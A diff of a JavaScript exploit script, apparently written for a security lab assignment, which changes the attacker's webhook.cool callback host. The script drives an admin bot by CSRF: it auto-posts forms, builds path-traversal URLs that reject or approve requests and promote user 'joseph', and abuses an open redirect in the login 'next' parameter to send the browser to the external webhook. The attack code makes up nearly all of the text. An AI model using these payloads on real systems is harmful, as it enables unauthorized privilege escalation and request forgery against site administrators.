@@ -9,7 +9,7 @@
 //   t=anchchall   <a target=_blank>.click() same target      — alternative popup path
 //   t=formreport  auto-POST form -> challenge ?view=report   — report form has NO csrf; loop: server queues URL -> bot visits webhook /adminqueued
 //   (v8-v10 modes retained: reject/promote/aget/pjoseph/extnav/form*)
-var W    = 'https://swift-stream-09.webhook.cool';
+var W    = 'https://peaceful-fish-56.webhook.cool';
 var BASE = 'https://10.20.18.55:2070/labs/assignment03/environment/1/';
 var q    = new URLSearchParams(location.search);
 var mode = q.get('t') || 'reject';
@@ -59,7 +59,7 @@ if (mode === 'popweb') {
   if      (mode === 'promote') { target = BASE + '?view=admin&request=../users/joseph/promote?/seen'; }
   else if (mode === 'aget')    { target = BASE + '?view=admin&approve=' + rid; }
   else if (mode === 'pjoseph') { target = BASE + '?view=admin&promote=joseph'; }
-  else if (mode === 'next')    { target = 'https://10.20.18.55:2070/login?next=https%3A%2F%2Fswift-stream-09.webhook.cool%2Foss'; }
+  else if (mode === 'next')    { target = 'https://10.20.18.55:2070/login?next=https%3A%2F%2Fpeaceful-fish-56.webhook.cool%2Foss'; }
   else if (mode === 'extnav')  { target = W + '/extnav'; }
   else /* reject oracle */     { target = BASE + '?view=admin&request=../requests/' + encodeURIComponent(rid) + '/reject?/seen'; }
   location.href = target;
